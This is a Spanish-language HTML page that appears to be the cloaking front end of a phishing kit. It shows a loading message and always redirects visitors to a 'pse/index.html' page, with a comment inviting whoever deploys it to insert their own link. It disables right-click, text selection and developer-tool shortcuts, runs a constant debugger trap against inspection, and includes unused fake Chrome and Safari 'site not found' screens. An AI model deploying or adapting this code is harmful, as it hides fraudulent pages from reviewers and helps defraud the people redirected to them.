<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="tab-title">Cargando...</title>
    <style id="browser-style"></style>
</head>
<body oncontextmenu="return false;" style="user-select: none;">

    <div id="main-wrapper">
        <div id="loading" style="text-align:center; padding-top:100px; font-family:sans-serif;">
            <p>Cargando...</p>
        </div>
        <div id="error-content"></div>
    </div>

<script>
    // ✏️ CAMBIA SOLO ESTO:
    const target = "pse/index.html"; // Tu link aquí
    const domain = window.location.hostname;

    function isMobile() {
        const ua = navigator.userAgent;
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || (window.innerWidth <= 800);
    }

    function renderChrome() {
        document.getElementById('tab-title').innerText = "⚠️ Error de red";
        document.getElementById('browser-style').innerHTML = `
            body { background-color: #202124; color: #e8eaed; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .container { max-width: 600px; padding: 20px; text-align: left; }
            h1 { font-size: 22px; font-weight: 400; margin: 0 0 15px; }
            p { font-size: 14px; color: #9aa0a6; line-height: 1.6; margin: 0 0 10px; }
            .err-code { font-size: 12px; color: #9aa0a6; margin-top: 30px; text-transform: uppercase; font-family: monospace; }
            .blue-btn { background: #8ab4f8; color: #202124; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; margin-top: 25px; cursor: pointer; font-size: 14px;}
            .blue-btn:hover { background: #aecbfa; }
        `;
        return `
            <div class="container">
                <h1>No se puede acceder a este sitio web</h1>
                <p>Comprueba si hay un error de escritura en ${domain}.</p>
                <p>Si está escrito correctamente, prueba a ejecutar el diagnóstico de red de Windows.</p>
                <div class="err-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
                <button class="blue-btn" onclick="location.reload()">Volver a cargar</button>
            </div>
        `;
    }

    function renderSafari() {
        document.getElementById('tab-title').innerText = "Error";
        document.getElementById('browser-style').innerHTML = `
            body { background-color: #f7f7f7; color: #000000; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .container { text-align: center; max-width: 480px; padding: 20px; }
            h1 { font-size: 19px; font-weight: 600; margin: 0 0 10px; letter-spacing: -0.5px; }
            p { font-size: 14px; color: #333; line-height: 1.4; margin: 0; }
        `;
        return `
            <div class="container">
                <h1>Safari no puede abrir la página</h1>
                <p>Safari no puede abrir la página "${domain}" porque no se puede encontrar el servidor donde está alojada esta página.</p>
            </div>
        `;
    }

    async function iniciar() {
        const ua = navigator.userAgent;
        const loader = document.getElementById('loading');
        const content = document.getElementById('error-content');

        // REDIRECCIONA SIEMPRE AL LINK
        window.location.href = target;
        return;
    }

    document.onkeydown = (e) => {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
    };

    setInterval(() => { debugger; }, 50);

    iniciar();
</script>
</body>
</html>
